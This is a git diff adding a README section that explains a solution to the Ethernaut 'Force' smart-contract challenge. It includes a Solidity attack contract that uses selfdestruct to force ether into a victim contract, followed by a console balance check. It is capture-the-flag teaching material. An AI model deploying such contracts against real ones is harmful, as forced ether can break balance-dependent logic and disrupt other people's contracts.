@@ -153,6 +153,42 @@ Now, let's come to the challenge:
     await contract.owner()
 ```
 
+## 07 - Force
+
+For Reference -> [Challenge](./questions/07.Force.sol) | [Solution](./answers/07.Force.sol)
+
+At first, this challenge seems confusing but as you dig a little bit deeper you will find `selfdestruct` function which is the key to solve this challenge. What `selfdestruct` do is, it will destroy the contract (where it is used) and send all the ether to the address provided as an argument.
+
+1. First, deploy the contract provided in [Solution](./answers/07.Force.sol) file. The contract will take the address of the victim contract as an argument.
+
+```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.0;
+
+    interface Force{}
+
+    contract Hack{
+        Force public force;
+
+        constructor(address _victim) {
+            force = Force(payable(_victim));
+        }
+
+        // This is the attack function, and make sure it be payable
+        function attack() external payable{
+            selfdestruct(payable(address(force)));
+        }
+    }
+```
+
+2. Now, call the `attack` function which will destroy the contract and send all the ether to the victim contract.
+
+3. At last, check the balance of the victim contract and submit!
+
+```javascript
+    await contract.balance()
+```
+
 ## Contributing
 
 Contributions to the Ethernaut_Practice project are welcome! If you have a solution to a challenge that is not yet included, or if you have suggestions for improvements, feel free to open a pull request.
